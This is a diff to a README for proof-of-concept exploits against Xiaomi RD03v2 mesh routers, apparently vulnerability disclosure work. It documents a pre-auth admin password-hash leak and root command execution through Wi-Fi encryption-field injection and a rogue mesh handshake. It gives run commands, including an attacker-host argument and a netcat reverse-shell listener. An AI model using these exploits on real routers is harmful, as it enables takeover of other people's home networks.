@@ -14,12 +14,11 @@ docstring; the `cab_meshd` internals are in
 | Script | For | What it does |
 |---|---|---|
 | `init_router.py` | prep | Minimally initializes a *factory* unit through `router_init`, sets `INITTED=YES`, and opens the CAP listener after reboot while leaving `NETMODE` unset. This differs from the normal web wizard, which can set `whc_cap`. It retains the factory admin verifier. |
-| `extract_admin.py` | **V1** | **The primary PoC.** Leak `web_passwd256` over 19553 (pre-auth), then mint an admin `stok`. **Read-only** against the target (never sends `type-7`). Confirmed on hardware. |
+| `extract_admin.py` | **V1** | Leak `web_passwd256` over 19553, then mint an admin `stok`. Sends no `type-7` and changes no persistent configuration, but creates transient session/replay state. Confirmed on hardware. |
 | `ota_rce.py` | **V1+V2** | **Root RCE in the tested gate-open mode.** Chains V1 → V2 via `encryption`-field injection and a root callback. Stops before planting unless `get_netmode` confirms numeric `0`. **Confirmed on hardware after minimal initialization.** |
 | `re_wan_rce.py` | **V2 RE/WAN** | **Direct pre-auth root RCE against a factory-reset router.** Answers WAN discovery as a rogue CAP, authenticates with the `x` key, sends type-6, and captures `uid=0(root)`. No V1, admin session, or `init_router.py`. **Confirmed on hardware.** |
 | `handshake.py` | inspection | Full mesh protocol driver: forges the constant-key handshake to `ST_RUNNING` and prints the CAP's sync config (where `web_passwd256` appears). `--no-trigger` stops before `cap_init`; `--dump-sync PATH` saves the raw type-6 body. |
-| `rce_poc.py` | **V2** | **Root command execution (CAP/LAN direct path).** base64'd `--cmd` in the type-4 **plant** (`body[0x90]`), full `4→5→7` handshake. Confirmed in emulation (root-owned file). ~4-char one-shot. Used as the trigger component of `ota_rce.py`. See `../chain2-root-rce.md`. |
-| `exploit.py` | historical | Non-working CAP driver retained as an annotated record of the earlier offset theory. Use `rce_poc.py` for CAP/LAN or `re_wan_rce.py` for RE/WAN. |
+| `rce_poc.py` | **V2** | **Root command execution (CAP/LAN direct path).** base64'd `--cmd` in the type-4 **plant** (`body[0x90]`), full `4→5→7` handshake. Confirmed in emulation (root-owned file). ~4-char one-shot. Used as the trigger component of `ota_rce.py`. See `../v2-root-rce.md`. |
 
 ## Primary run (device you own)
 
@@ -27,7 +26,7 @@ The V2 hardware test used the gate-open mode left by `init_router.py`. On an
 ordinarily web-configured unit, `NETMODE=whc_cap` can block the demonstrated
 CAP root path even though V1 admin takeover still works. A full reset erases
 settings; repeating the normal web wizard can set the same mode again. See
-[`../CORRECTIONS.md`](../CORRECTIONS.md).
+[`../v2-root-rce.md`](../v2-root-rce.md).
 
 ```bash
 # only if the unit is at factory defaults (19553 closed):
@@ -47,7 +46,11 @@ promptly; ordinary web setup is a different path and can close the V2 gate.
 
 The factory RE/WAN PoC below is a separate path. It does not use this preparation.
 
-## V2 OTA — root RCE in the gate-open state (confirmed on hardware)
+## V1-assisted OTA CAP delivery (confirmed on hardware)
+
+This section assumes the preparation immediately above has completed: the router
+was factory-reset, `init_router.py --reboot` set `INITTED=YES`, the CAP listener is
+running, and `NETMODE` remains unset. `ota_rce.py` does not perform that preparation.
 
 ```bash
 # Terminal 1 — run the PoC (starts its own HTTP server on port 8000):
@@ -57,7 +60,7 @@ python3 ota_rce.py --host 192.168.31.1 --attacker 192.168.31.231
 nc -l -p 4444
 ```
 
-`ota_rce.py` automates the full chain:
+After preparation, `ota_rce.py` automates the V1-assisted V2 delivery:
 1. **V1** — leaks `web_passwd256`, mints admin `stok` (pre-auth, over Wi-Fi)
 2. **Plant** — writes injection payloads into Wi-Fi `encryption` UCI keys via
    `set_wifi_without_restart`; preserves the original SSID
@@ -82,9 +85,9 @@ that SSID shadows the new WPA2 one and `nmcli` fails with
 then retry. The reverse shell loop retries every 10 seconds, so if the `nc` listener
 disconnects, starting a new one picks up a fresh shell.
 
-This root chain was confirmed over Wi-Fi on physical RD03v2 hardware after
+This V1-assisted V2 delivery was confirmed over Wi-Fi on physical RD03v2 hardware after
 minimal initialization left `NETMODE` unset. Reachability after ordinary
-Xiaomi web setup has not been demonstrated. See `../chain2-root-rce.md` for the
+Xiaomi web setup has not been demonstrated. See `../v2-root-rce.md` for the
 technical breakdown.
 
 ## V2 RE/WAN — direct factory root RCE (confirmed on hardware)
@@ -141,25 +144,26 @@ python3 rce_poc.py --host 192.168.31.1 --cmd '>W'   # creates root-owned /W; ~4-
 Delivers `base64('`>W`')` in the type-4 plant, completes `4→5→7`, and the daemon
 drives `mimesh_init`'s `eval` as root when the CAP gate is open. Confirmed in
 emulation. A completed `cap_init` can set `NETMODE=whc_cap` and close that gate;
-normal web setup can set the same mode without any exploit.
+the shell also skips `NETMODE=lanapmode` with `CAP_MODE=ap`. Supported reproduction
+uses API `get_netmode=0` with UCI `NETMODE` unset.
 The payload budget is ~4 characters here. The RE/WAN path has a larger 32/64-byte
-reliable budget and is confirmed end-to-end on hardware; see `../chain2-root-rce.md`.
+reliable budget and is confirmed end-to-end on hardware; see `../v2-root-rce.md`.
 `ota_rce.py` uses the CAP handshake as its trigger and plants the longer payload
 through the admin Wi-Fi API in the tested gate-open state.
 
 ## Safety / footprint
-- `extract_admin.py` and `handshake.py --no-trigger` change nothing on the device.
+- `extract_admin.py` and `handshake.py --no-trigger` do not alter persistent
+  configuration; `extract_admin.py` creates transient login/session state.
 - `ota_rce.py` modifies the device's Wi-Fi encryption UCI keys and triggers
   `cap_init`; the self-repairing payload restores valid encryption afterward, but the
   trigger can change `NETMODE` and Wi-Fi state.
 - **If the CAP mode is gated or cannot be confirmed, `ota_rce.py` stops before
   planting anything.** `NETMODE=whc_cap` blocks this sink but does not prove a
-  previous exploit. On an owned test unit, a full reset followed by the minimal
+  previous exploit; `lanapmode` with `CAP_MODE=ap` also skips it. On an owned
+  test unit, a full reset followed by the minimal
   `init_router.py` setup can reproduce the tested gate-open state; a normal web
   setup can close it again.
 - `rce_poc.py` sends a `cap_init` trigger and can execute its short command on a
-  gate-open unit. Historical `exploit.py` does not land its e6/107 payload on CAP,
-  but it still sends active protocol traffic and should not be used as a read-only
-  inspection probe.
+  gate-open unit.
 - `re_wan_rce.py` completes `re_init` and changes the factory router into an
   initialized mesh RE. A factory reset is required to restore the starting state.
